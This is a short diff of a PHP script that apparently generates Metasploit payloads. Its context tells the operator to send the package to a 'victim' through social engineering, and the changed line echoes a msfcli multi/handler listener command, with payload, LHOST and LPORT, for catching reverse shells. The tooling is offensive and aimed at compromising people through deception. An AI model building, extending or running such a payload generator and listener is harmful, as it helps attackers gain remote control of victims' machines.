@@ -78,7 +78,7 @@ echo '<b>Note:</b>You can send this package to victim by any social engineering 
 
 
 echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
-echo 'sudo msfcli exploit/multi/handler PAYLOAD='.$c.'  LHOST='.$ip.' LPORT='.$port.' E'; 
+echo '<code style="float:top;backface-visibility: visible;background-color:#BBB7B7;color:#5A7359"><b>sudo msfcli exploit/multi/handler PAYLOAD='.$c.'  LHOST='.$ip.' LPORT='.$port.' E </b></code>'; 
 
 }else {
     echo "Possible file upload attack!\n";
